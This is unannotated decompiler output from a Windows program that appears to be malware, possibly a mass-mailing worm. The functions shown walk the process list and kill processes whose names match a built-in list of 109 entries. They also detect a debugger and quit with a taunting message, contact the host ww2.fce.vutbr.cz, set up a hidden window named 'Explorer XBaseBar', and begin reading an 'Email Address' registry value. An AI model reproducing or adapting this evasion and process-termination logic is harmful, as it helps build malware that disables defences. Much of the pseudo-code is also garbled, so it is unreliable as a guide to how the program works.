// Generated by Rec Studio 4 - build Sep 23 2015

L00401000(
    _unknown_ __edx,                       // r3
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8                           // _cfa_8
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    char _v288;                            // _cfa_fffffee0
    signed int _v292;                      // _cfa_fffffedc
    signed int _v296;                      // _cfa_fffffed8
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    _unknown_ _t27;                        // _t27
    _unknown_ _t29;                        // _t29
    intOrPtr _t32;                         // _t32
    _unknown_ _t33;                        // _t33
    _unknown_ _t35;                        // _t35
    _unknown_ _t37;                        // _t37
    intOrPtr _t38;                         // _t38

    __edx = __edx;
    _push(-1);
    _push(4252272);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 276;
    _push(__ebx);
    _push(_t37);
    _push(_t35);
    _v28 = __esp;
    _v8 = 0;
    _v296 = 0;
    _t38 = _a4;
    _t27 = L0040A210( *fs:0x0], _t38);
    if(_t27 == 0) {
L10:
        _v8 = _v8 | -1;
    } else {
        if(_a8 != 0) {
            _push(92);
            _push(_t38);
            _t32 = L0040A1E0(_t33);
            _pop(__ecx);
            _pop(__ecx);
            _v296 = _t32;
        }
        if(_v296 != 0) {
            _v296 = _v296 + 1;
        } else {
            _v296 = _t38;
        }
        _push(_v296);
        _push( &_v288);
        _t29 = L0040A0F0(__edx);
        _pop(__ecx);
        _pop(__ecx);
        _push(_t29);
        __imp__CharLowerA();
        _v292 = 0;
        while(_v292 < 109) {
            _push( *((intOrPtr*)(4259888 + _v292 * 4)));
            _push( &_v288);
            _t27 = L0040A070( &_v288, __edx);
            _pop(__ecx);
            _pop(__ecx);
            if(_t27 == 0) {
                _v292 = _v292 + 1;
                continue;
            } else {
                _push(1);
                _pop(__eax);
                goto L10;
            }
            goto L13;
        }
        _v8 = _v8 | -1;
        _t27 = 0;
    }
L13:
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return _t27;
}

L004010E3(
    _unknown_ __ecx,                       // r2
    intOrPtr _a4,                          // _cfa_4
    char* _a8                              // _cfa_8
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    char _v80;                             // _cfa_ffffffb0
    char _v84;                             // _cfa_ffffffac
    signed short* _v88;                    // _cfa_ffffffa8
    char _v5208;                           // _cfa_ffffeba8
    char _v5228;                           // _cfa_ffffeb94
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    intOrPtr* __esi;                       // r5
    signed short* _t33;                    // _t33
    _unknown_ _t40;                        // _t40
    _unknown_ _t46;                        // _t46
    char* _t47;                            // _t47

    _push(4252288);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    _push(__ecx);
    _push(__ecx);
    L0040A560(5200, __ecx, -1);
    _push(_t40);
    _push(__esi);
    _push(_t46);
    _v28 = __esp;
    _v8 = 0;
    _t47 = _a8;
     *_t47 = 0;
    _push( &_v5208);
    _push(5120);
    _push(0);
    _push(_a4);
    GetFileVersionInfoA();
    if( &_v5208 != 0) {
        _push( &_v84);
        _push( &_v88);
        _push("\\VarFileInfo\\Translation");
        _push( &_v5208);
        VerQueryValueA();
        if( &_v5208 != 0 && _v84 != 0) {
            _t33 = _v88;
            _push( *_t33 >> 16);
            _push( *_t33 & 65535);
            _push("%04X%04X");
            _push( &_v5228);
            __esi = __imp__wsprintfA;
             *__esi();
            __esp = __esp + 16;
            if( &_v5228 == 8) {
                _push( &_v5228);
                _push("\\StringFileInfo\\%s\\OriginalFilename");
                _push( &_v80);
                 *__esi();
                __esp = __esp + 12;
                _push( &_v84);
                _push( &_v88);
                _push( &_v80);
                _push( &_v5208);
                VerQueryValueA();
                if( &_v5208 != 0 && _v84 > 0 && _v84 <= 39) {
                    L0040A460( &_v5208, _t47, _v88, _v84);
                     *((char*)(_v84 + _t47)) = 0;
                }
            }
        }
    }
    _v8 = _v8 | -1;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
}

L00401294()
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    intOrPtr _v32;                         // _cfa_ffffffe0
    intOrPtr _v36;                         // _cfa_ffffffdc
    signed int _v40;                       // _cfa_ffffffd8
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    intOrPtr __esi;                        // r5
    _unknown_ _t11;                        // _t11
    _unknown_ _t13;                        // _t13
    signed int _t14;                       // _t14

    _push(-1);
    _push(4252320);
    _push(4236164);
    __eax =  *fs:0x0];
    _push(__eax);
     *fs:0x0] = __esp;
    __esp = __esp - 20;
    _push(_t11);
    _push(__esi);
    _push(_t13);
    _v28 = __esp;
    _v8 = 0;
    _push(0);
    _push(4198911);
    __imp__EnumWindows();
    _t14 = 0;
    while(1) {
        _v40 = _t14;
        if(_t14 >=  *4271568) {
            break;
        }
        __eax =  *((intOrPtr*)(4271368 + _t14 * 4));
        if(__eax != 0) {
            _push(__eax);
            _push(0);
            _push(1048577);
            __imp__OpenProcess();
            __esi = __eax;
            _v32 = __esi;
            if(__esi != 0) {
                _push(200);
                _push(__esi);
                __imp__WaitForSingleObject();
                _v36 = __eax;
                if(__eax == 258) {
                    _push(0);
                    _push(__esi);
                    __imp__TerminateProcess();
                }
                _push(__esi);
                __imp__CloseHandle();
            }
        }
        _t14 = _t14 + 1;
    }
    _v8 = _v8 | -1;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return __eax;
}

L0040133B()
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    unsigned int _v32;                     // _cfa_ffffffe0
    signed int _v36;                       // _cfa_ffffffdc
    signed int _v40;                       // _cfa_ffffffd8
    intOrPtr _v44;                         // _cfa_ffffffd4
    char _v308;                            // _cfa_fffffecc
    intOrPtr _v312;                        // _cfa_fffffec8
    signed int _v316;                      // _cfa_fffffec4
    char _v712;                            // _cfa_fffffd38
    char _v716;                            // _cfa_fffffd34
    char _v720;                            // _cfa_fffffd30
    intOrPtr _v724;                        // _cfa_fffffd2c
    intOrPtr _v728;                        // _cfa_fffffd28
    intOrPtr _v732;                        // _cfa_fffffd24
    intOrPtr _v736;                        // _cfa_fffffd20
    char _v996;                            // _cfa_fffffc1c
    intOrPtr _v1024;                       // _cfa_fffffc00
    char _v1028;                           // _cfa_fffffbfc
    char _v1032;                           // _cfa_fffffbf8
    intOrPtr _v1036;                       // _cfa_fffffbf4
    intOrPtr _v1040;                       // _cfa_fffffbf0
    signed int _v1044;                     // _cfa_fffffbec
    signed int _v1048;                     // _cfa_fffffbe8
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    intOrPtr* __esi;                       // r5
    signed int _t67;                       // _t67
    _unknown_ _t76;                        // _t76
    signed int _t78;                       // _t78
    signed int _t79;                       // _t79
    _unknown_ _t86;                        // _t86
    intOrPtr _t89;                         // _t89
    intOrPtr* _t92;                        // _t92

    _push(-1);
    _push(4252336);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 1028;
    _push(_t76);
    _push(__esi);
    _push(_t86);
    _v28 = __esp;
    _v8 = 0;
    L0040A590(4271368, 0, 200);
     *4271568 = 0;
    if( *4302444 != 0) {
        _v1044 = 0;
        _v1032 = 0;
        _push(73);
        _pop(__ecx);
        _t67 = 0;
        _push(_t79 << 2);
        _push(0);
        _push( &_v1028);
        memset();
        __esp = __esp + 12;
        _push("kernel32.dll");
        __imp__GetModuleHandleA();
        _t89 = 0;
        _v1040 = 0;
        if(0 == 0) {
L34:
            _v8 = _v8 | -1;
             *fs:0x0] = _v20;
            _pop(__edi);
            _pop(__esi);
            _pop(__ebx);
            return;
        }
        _push("CreateToolhelp32Snapshot");
        _push(0);
        __esi = __imp__GetProcAddress;
         *__esi();
        _v1036 = 0;
        _push("Process32First");
        _push(0);
         *__esi();
        _v736 = 0;
        _push("Process32Next");
        _push(0);
         *__esi();
        _v732 = 0;
        if(_v1036 != 0 && _v736 != 0 && 0 != 0) {
            _push(0);
            _push(2);
            _v1036();
            _t89 = 0;
            _v1044 = 0;
            if(0 == -1) {
                goto L34;
            }
            _v1032 = 296;
            _t67 =  &_v1032;
            _push( &_v1032);
            _push(0);
            _v736();
            while(_t67 != 0) {
                _push(1);
                _push( &_v996);
                L00401000(__edx);
                _pop(__ecx);
                _pop(__ecx);
                if( &_v996 != 0) {
                     *((intOrPtr*)(4271368 +  *4271568 * 4)) = _v1024;
                     *4271568 =  *4271568 + 1;
                }
                _t67 =  &_v1032;
                _push( &_v1032);
                _push(_t89);
                _v732();
            }
            _push(_t89);
            __imp__CloseHandle();
L28:
            if( *4271568 > 0) {
                L00401294();
            }
            _push("kernel32.dll");
            __imp__GetModuleHandleA();
            _v40 = _t67;
            if(_t67 != 0) {
                _push("IsDebuggerPresent");
                _push(_t67);
                 *__esi();
                _v1048 = _t67;
                if(_t67 != 0) {
                     *_t67();
                    if(_t67 != 0) {
                        _push(0);
                        _push(" ");
                        _push("Try to pull my legs?");
                        _push(0);
                        __imp__MessageBoxA();
                        _push(0);
                        _push(0);
                        _push(18);
                        _push(65535);
                        __imp__PostMessageA();
                        _push(0);
                        __imp__ExitProcess();
                    }
                }
            }
        }
        goto L34;
    }
    _v716 = 0;
    _push(99);
    _pop(__ecx);
    _t67 = 0;
    _push(_t79 << 2);
    _push(0);
    _push( &_v712);
    memset();
    __esp = __esp + 12;
    _push("psapi.dll");
    __imp__LoadLibraryA();
    _t89 = 0;
    _v44 = 0;
    if(0 == 0) {
        goto L34;
    }
    _push("EnumProcesses");
    _push(0);
    __esi = __imp__GetProcAddress;
     *__esi();
    _v728 = 0;
    _push("EnumProcessModules");
    _push(0);
     *__esi();
    _v312 = 0;
    _push("GetModuleFileNameExA");
    _push(0);
     *__esi();
    _v724 = 0;
    if(_v728 == 0 || _v312 == 0 || 0 == 0) {
        _push(_t89);
        __imp__FreeLibrary();
        goto L34;
    } else {
        _push( &_v32);
        _push(400);
        _t67 =  &_v716;
        _push( &_v716);
        _v728();
        if( &_v716 == 0) {
L15:
            _push(_t89);
            __imp__FreeLibrary();
            goto L28;
        } else {
            _v36 = 0;
            while(1) {
                _t67 = _v36;
                if(_t67 >= _v32 >> 2) {
                    goto L15;
                }
                _t92 = __ebp + _t67 * 4 - 712;
                _push( *_t92);
                _push(0);
                _push(1040);
                __imp__OpenProcess();
                _t78 = _t67;
                _v316 = _t78;
                if(_t78 != 0) {
                    _push( &_v32);
                    _push(4);
                    _push( &_v720);
                    _push(_t78);
                    _v312();
                    if( &_v720 != 0) {
                        _push(261);
                        _push( &_v308);
                        _push(_v720);
                        _push(_t78);
                        _v724();
                        _v32 =  &_v308;
                        if( &_v308 != 0) {
                             *((char*)(__ebp +  &_v308 - 304)) = 0;
                            _push(1);
                            _push( &_v308);
                            L00401000(__edx);
                            _pop(__ecx);
                            _pop(__ecx);
                            if( &_v308 != 0) {
                                 *((intOrPtr*)(4271368 +  *4271568 * 4)) =  *_t92;
                                 *4271568 =  *4271568 + 1;
                            }
                        }
                    }
                    _push(_t78);
                    __imp__CloseHandle();
                }
                _v36 = _v36 + 1;
                _t89 = _v44;
            }
            goto L15;
        }
    }
}

L004018C0(
    _unknown_ __eax                        // r0
)
{
    _push(6);
    _push(1);
    _push(2);
    L0040A016();
    if(__eax == -1) {
        return 0;
    }
    return __eax;
}

L004018D3(
    intOrPtr* __ecx                        // r2
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    intOrPtr _t10;                         // _t10
    _unknown_ _t11;                        // _t11
    _unknown_ _t15;                        // _t15

    _push(-1);
    _push(4252384);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 12;
    _push(_t11);
    _push(_t15);
    _push(__edi);
    _v28 = __esp;
    _v8 = 0;
    _t10 =  *__ecx;
    if(_t10 != 0) {
        _push(_t10);
        L0040A01C();
         *__ecx = 0;
         *((char*)(__ecx + 30008)) = 0;
         *((short*)(__ecx + 30158)) = 0;
         *((char*)(__ecx + 4)) = 0;
        _push( *4271572);
        __imp__SetEvent();
    }
    _v8 = _v8 | -1;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return _t10;
}

signed int L00401946(
    signed int* __ecx,                     // r2
    _unknown_ __edx,                       // r3
    intOrPtr _a4,                          // _cfa_4
    signed int _a8,                        // _cfa_8
    intOrPtr _a12                          // _cfa_c
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    char _v32;                             // _cfa_ffffffe0
    char* _v36;                            // _cfa_ffffffdc
    char _v40;                             // _cfa_ffffffd8
    signed int _v52;                       // _cfa_ffffffcc
    short _v54;                            // _cfa_ffffffca
    char _v56;                             // _cfa_ffffffc8
    signed int _v60;                       // _cfa_ffffffc4
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    signed int _t32;                       // _t32
    signed int _t36;                       // _t36
    _unknown_ _t43;                        // _t43
    signed int _t45;                       // _t45
    signed int _t46;                       // _t46
    _unknown_ _t52;                        // _t52
    _unknown_ _t54;                        // _t54

    __edx = __edx;
    _push(-1);
    _push(4252400);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 44;
    _push(_t45);
    _push(_t54);
    _push(_t52);
    _v28 = __esp;
    _t46 = _t45 | -1;
    _v32 = _t46;
    _v8 = 0;
    _push( *4271572);
    __imp__ResetEvent();
    if( *__ecx == 0) {
L5:
        _t32 = L004018C0(L004018D3(__ecx));
         *__ecx = _t32;
        if(_t32 > 0) {
            _push(_a4);
            L0040A03A();
            _v32 = _t32;
            if(_t32 != _t46) {
L10:
                _v56 = 2;
                _push(_a8);
                L0040A02E();
                _v54 = _t32;
                _v52 = _v32;
                _push(16);
                _push( &_v56);
                _push( *__ecx);
                L0040A028();
                _v36 =  &_v56;
                if( &_v56 == _t46) {
                    goto L12;
                } else {
                    _push(33);
                    _push(1044);
                    _push(_a12);
                    _push( *__ecx);
                    L0040A022();
                    if( &_v56 != _t46) {
                        _push(_a4);
                        _push( &(__ecx[0x1d4e]));
                        L0040A0F0(__edx);
                        _pop(__ecx);
                        _pop(__ecx);
                        _t36 = _a8;
                        __ecx[0x1d73] = _t36;
                        _push(1);
                        _pop(__eax);
                    } else {
                        goto L12;
                    }
                }
            } else {
                _push(_a4);
                L0040A034();
                _v60 = _t32;
                if(_t32 == 0) {
L12:
                    L004018D3(__ecx);
                    goto L13;
                } else {
                    _push(4);
                    _push( *((intOrPtr*)(_t32 + 12)));
                    _push( &_v40);
                    L0040A760();
                    _t32 = L0040A760( &_v32, _v40, 4);
                    __esp = __esp + 12;
                    goto L10;
                }
            }
        } else {
             *__ecx = 0;
L13:
            _t36 = 0;
        }
    } else {
        _push(_a4);
        _push( &(__ecx[0x1d4e]));
        _t43 = L0040D680(__ecx);
        _pop(__ecx);
        _pop(__ecx);
        if(_t43 != 0 || __ecx[0x1d73] != _a8) {
            goto L5;
        } else {
            _t36 = _t46;
        }
    }
    _v8 = _t46;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return _t36;
}

L00401A9E(
    intOrPtr* __ecx,                       // r2
    intOrPtr _a4                           // _cfa_4
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    signed int _v32;                       // _cfa_ffffffe0
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    _unknown_ _t13;                        // _t13

    _push(-1);
    _push(4252416);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 16;
    _push(__ebx);
    _push(_t13);
    _push(__edi);
    _v28 = __esp;
    _t10 = 0;
    _v8 = 0;
    if( *__ecx != 0) {
        _push(0);
        _t10 = L0040A210(0, _a4);
        _push(0);
        _push(_a4);
        _push( *__ecx);
        L0040A040();
        _v32 = 0;
    }
    _v8 = _v8 | -1;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return _t10;
}

L00401B0D(
    _unknown_ __ecx                        // r2
)
{
    __ecx = __ecx;
    return 0;
}

L00401B15(
    _unknown_ __ecx,                       // r2
    intOrPtr _a4                           // _cfa_4
)
{
    __ecx = __ecx;
    __eax = _a4;
     *((intOrPtr*)(__ecx + 30004)) = __eax;
    return __eax;
}

L00401B22(
    intOrPtr* __ecx,                       // r2
    char* _a4,                             // _cfa_4
    intOrPtr _a8                           // _cfa_8
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    intOrPtr _v32;                         // _cfa_ffffffe0
    intOrPtr _v36;                         // _cfa_ffffffdc
    _unknown_ __ebx;                       // r1
    intOrPtr __edi;                        // r4
    _unknown_ __esi;                       // r5
    intOrPtr _t26;                         // _t26
    intOrPtr _t27;                         // _t27
    _unknown_ _t29;                        // _t29
    char* _t30;                            // _t30
    _unknown_ _t33;                        // _t33

    _push(-1);
    _push(4252432);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 20;
    _push(_t29);
    _push(_t33);
    _push(__edi);
    _v28 = __esp;
    _v8 = 0;
    _t30 = _a4;
    if(L0040A210( *fs:0x0], _t30) > 64 ||  *_t30 == 0) {
        _v8 = _v8 | -1;
        _t26 = 0;
        goto L14;
    } else {
        if(_a8 != 0) {
            _push(_t30);
            __imp__CharLowerA();
        }
        __edi =  *__ecx;
        while(1) {
            _v32 = __edi;
            if(__edi == 0) {
                break;
            }
            _push(_t30);
            _push(__edi);
            _t26 = L0040AAB0();
            _pop(__ecx);
            _pop(__ecx);
            if(_t26 != 0) {
                __edi =  *((intOrPtr*)(__edi + 68));
                continue;
            }
L7:
            _v8 = _v8 | -1;
L14:
             *fs:0x0] = _v20;
            _pop(__edi);
            _pop(__esi);
            _pop(__ebx);
            return _t26;
        }
        _t27 = L0040AA95(72);
        _v36 = _t27;
        _v32 = _t27;
        if( *((intOrPtr*)(__ecx + 8)) != 0) {
             *((intOrPtr*)( *((intOrPtr*)(__ecx + 4)) + 68)) = _t27;
        } else {
             *__ecx = _t27;
        }
         *((intOrPtr*)(__ecx + 4)) = _t27;
        _push(_t30);
        _push(_t27);
        L0040A0F0(__edx);
        _pop(__ecx);
        _pop(__ecx);
        _t26 =  *((intOrPtr*)(__ecx + 4));
         *((intOrPtr*)(_t26 + 68)) = 0;
         *((intOrPtr*)(__ecx + 8)) =  *((intOrPtr*)(__ecx + 8)) + 1;
        _push(1);
        _pop(__eax);
        goto L7;
    }
}

L00401BE7(
    intOrPtr* __ecx                        // r2
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    intOrPtr _v32;                         // _cfa_ffffffe0
    intOrPtr _v36;                         // _cfa_ffffffdc
    intOrPtr _v40;                         // _cfa_ffffffd8
    _unknown_ __ebx;                       // r1
    intOrPtr __edi;                        // r4
    _unknown_ __esi;                       // r5
    intOrPtr _t13;                         // _t13
    _unknown_ _t15;                        // _t15
    _unknown_ _t19;                        // _t19

    _push(-1);
    _push(4252448);
    _push(4236164);
    _t13 =  *fs:0x0];
    _push(_t13);
     *fs:0x0] = __esp;
    __esp = __esp - 24;
    _push(_t15);
    _push(_t19);
    _push(__edi);
    _v28 = __esp;
    _v8 = 0;
    if( *((intOrPtr*)(__ecx + 8)) != 0) {
        _t13 =  *__ecx;
        while(1) {
            _v36 = _t13;
            if(_t13 == 0) {
                break;
            }
            __edi =  *((intOrPtr*)(_t13 + 68));
            _v32 = __edi;
            _v40 = _t13;
            L0040AB34(_t13);
            _t13 = __edi;
        }
         *((intOrPtr*)(__ecx + 8)) = 0;
         *__ecx = 0;
         *((intOrPtr*)(__ecx + 4)) = 0;
    }
    _v8 = _v8 | -1;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return _t13;
}

L00401C5A(
    intOrPtr* __ecx,                       // r2
    intOrPtr _a4                           // _cfa_4
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    intOrPtr _v32;                         // _cfa_ffffffe0
    char* _v36;                            // _cfa_ffffffdc
    char _v40;                             // _cfa_ffffffd8
    char _v44;                             // _cfa_ffffffd4
    signed int _v48;                       // _cfa_ffffffd0
    intOrPtr _v52;                         // _cfa_ffffffcc
    intOrPtr _v56;                         // _cfa_ffffffc8
    char* _v60;                            // _cfa_ffffffc4
    intOrPtr _v64;                         // _cfa_ffffffc0
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    _unknown_ _t36;                        // _t36
    char* _t38;                            // _t38
    intOrPtr _t39;                         // _t39
    _unknown_ _t46;                        // _t46
    _unknown_ _t52;                        // _t52
    intOrPtr _t54;                         // _t54
    intOrPtr _t55;                         // _t55

    _push(-1);
    _push(4252464);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 48;
    _push(_t46);
    _push(_t54);
    _push(_t52);
    _v28 = __esp;
    _v48 = 0;
    _v8 = 0;
    _t35 =  *(__ecx + 8);
    if( *(__ecx + 8) == 0) {
        _v8 = _v8 | -1;
        _t36 = 0;
    } else {
        _t38 = L0040AA95(_t35 * 66);
        _v60 = _t38;
        _v36 = _t38;
        if(_t38 != 0) {
             *_t38 = 0;
            _t55 =  *__ecx;
            while(1) {
                _v52 = _t55;
                if(_t55 == 0) {
                    break;
                }
                _t38 = _v48 + L0040A210(_t38, _t55) + 1;
                _v48 = _t38;
                if(_t38 <  *(__ecx + 8) * 66) {
                    _v32 =  *((intOrPtr*)(_t55 + 68));
                    _push(":");
                    _push(_v36);
                    _t38 = L0040A100(L0040A100( *((intOrPtr*)(_t55 + 68))), _v36, _t55);
                    __esp = __esp + 8;
                    _t55 = _v32;
                    continue;
                }
                break;
            }
            _t39 = L0040A210(_t38, _v36);
            _v48 = _t39;
            _push(0);
            _push(128);
            _push(4);
            _push(0);
            _push(3);
            _push(1073741824);
            _push(_a4);
            __imp__CreateFileA();
            _t54 = _t39;
            _v56 = _t54;
            if(_t54 != -1) {
                _v40 = 0;
                _push(2);
                _push( &_v40);
                _push(0);
                _push(_t54);
                __imp__SetFilePointer();
                _push(0);
                _push( &_v44);
                _push(_v48);
                _push(_v36);
                _push(_t54);
                __imp__WriteFile();
                _push(_t54);
                __imp__CloseHandle();
            }
            _v64 = _v36;
            _t36 = L0040AB34(_v36);
            _push(1);
            _pop(__eax);
        } else {
            _t36 = 0;
        }
        _v8 = _v8 | -1;
    }
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return _t36;
}

L0040436A(
    _unknown_ __ecx,                       // r2
    _unknown_ __edx                        // r3
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    _unknown_ _t9;                         // _t9
    _unknown_ _t20;                        // _t20

    __edx = __edx;
    _push(-1);
    _push(4252560);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    _push(__ecx);
    _push(__ecx);
    _push(__ebx);
    _push(_t20);
    _push(__edi);
    _v28 = __esp;
    _v8 = 0;
    if(L00401946(4271944, __edx, "ww2.fce.vutbr.cz", 80,  *4302556) == 0) {
        _t9 = 0;
    } else {
        L00401B15(4271944, 0);
        L00401A9E(4271944);
        if(L00401B0D(4271944) != 0) {
            _push(10000);
            _push( *4271572);
            __imp__WaitForSingleObject();
        }
        _t9 = L004018D3(4271944);
        _push(1);
        _pop(__eax);
    }
    _v8 = _v8 | -1;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return _t9;
}

signed int L0040494F(
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a12                          // _cfa_c
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    intOrPtr _v32;                         // _cfa_ffffffe0
    char _v60;                             // _cfa_ffffffc4
    intOrPtr _v192;                        // _cfa_ffffff40
    char _v204;                            // _cfa_ffffff34
    char _v208;                            // _cfa_ffffff30
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    intOrPtr _t19;                         // _t19
    _unknown_ _t25;                        // _t25
    _unknown_ _t30;                        // _t30
    _unknown_ _t33;                        // _t33
    signed int _t35;                       // _t35
    _unknown_ _t38;                        // _t38
    _unknown_ _t41;                        // _t41
    intOrPtr _t42;                         // _t42

    _push(-1);
    _push(4252608);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 188;
    _push(_t33);
    _push(_t41);
    _push(_t38);
    _v28 = __esp;
    _v8 = 0;
    _t19 = _a4;
     *4302228 = _t19;
    _push(100);
    _push(4271872);
    __imp__GetWindowsDirectoryA();
    _v32 = _t19;
     *((char*)(_t19 + 4271872)) = 0;
    _v208 = 0;
    _push(36);
    _pop(__ecx);
    _push(_t35 << 2);
    _push(0);
    _push( &_v204);
    memset();
    __esp = __esp + 12;
    _v208 = 148;
    _push( &_v208);
    __imp__GetVersionExA();
    if( &_v208 == 0) {
         *4302444 = 1;
    }
     *4302444 = 0;
    _push(32771);
    __imp__SetErrorMode();
    _t42 = _a12;
    if(L0040A210(_v192 != 2, _t42) != 0) {
        _push("autorun");
        _push(_t42);
        _t25 = L0040D680(0);
        _pop(__ecx);
        _pop(__ecx);
        if(_t25 != 0) {
            _push("showerror");
            _push(_t42);
            _t30 = L0040D680(0);
            _pop(__ecx);
            _pop(__ecx);
            if(_t30 != 0) {
                L00406BE3(__edx, _t42);
            } else {
                L004069E2(__edx);
            }
        }
    } else {
        L004089A1();
    }
    if(L00404A78() == 0) {
L11:
        _v8 = _v8 | -1;
         *fs:0x0] = _v20;
        _pop(__edi);
        _pop(__esi);
        _pop(__ebx);
        return 0;
    } else {
        while(1) {
            _push(0);
            _push(0);
            _push(0);
            _push( &_v60);
            __imp__GetMessageA();
            if( &_v60 == 0) {
                goto L11;
            }
            _push( &_v60);
            __imp__DispatchMessageA();
        }
        goto L11;
    }
}

L00404A78()
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    intOrPtr _v32;                         // _cfa_ffffffe0
    intOrPtr* _v40;                        // _cfa_ffffffd8
    intOrPtr _v60;                         // _cfa_ffffffc4
    intOrPtr _v72;                         // _cfa_ffffffb8
    char _v76;                             // _cfa_ffffffb4
    char _v80;                             // _cfa_ffffffb0
    char _v180;                            // _cfa_ffffff4c
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    intOrPtr _t23;                         // _t23
    intOrPtr _t28;                         // _t28
    intOrPtr _t34;                         // _t34
    intOrPtr _t38;                         // _t38
    intOrPtr _t39;                         // _t39
    _unknown_ _t40;                        // _t40
    signed int _t42;                       // _t42
    _unknown_ _t45;                        // _t45
    _unknown_ _t47;                        // _t47
    intOrPtr* _t48;                        // _t48

    _push(-1);
    _push(4252624);
    _push(4236164);
    _t23 =  *fs:0x0];
    _push(_t23);
     *fs:0x0] = __esp;
    __esp = __esp - 160;
    _push(_t40);
    _push(_t47);
    _push(_t45);
    _v28 = __esp;
    _v8 = 0;
    _t48 = "Explorer XBaseBar";
    _push(_t48);
    _push(_t48);
    __imp__FindWindowA();
    if(_t23 != 0) {
L22:
        _v8 = _v8 | -1;
        _t24 = 0;
        __eflags = 0;
L23:
         *fs:0x0] = _v20;
        _pop(__edi);
        _pop(__esi);
        _pop(__ebx);
        return;
    }
    _v80 = 0;
    _push(11);
    _pop(__ecx);
    _push(_t42 << 2);
    _push(_t23);
    _push( &_v76);
    memset();
    __esp = __esp + 12;
    _t45 =  &_v76 + _t42;
    _v80 = 48;
    _v72 = 4214887;
    _v60 =  *4302228;
    _v40 = _t48;
    _push( &_v80);
    __imp__RegisterClassExA();
    if( &_v80 == 0) {
        goto L22;
    }
    _push(0);
    _push( *4302228);
    _push(0);
    _push(0);
    _push(100);
    _push(300);
    _push(250);
    _push(250);
    _push(13565952);
    _push(_t48);
    _push(_t48);
    _push(0);
    __imp__CreateWindowExA();
     *4302556 = 250;
    _t48 = 4302344;
    if(L00406DCD(4302344) != 0) {
        _push(4271632);
        _push("Email Address");
        _push(4302344);
        _t45 = -2147483646;
        _push(-2147483646);
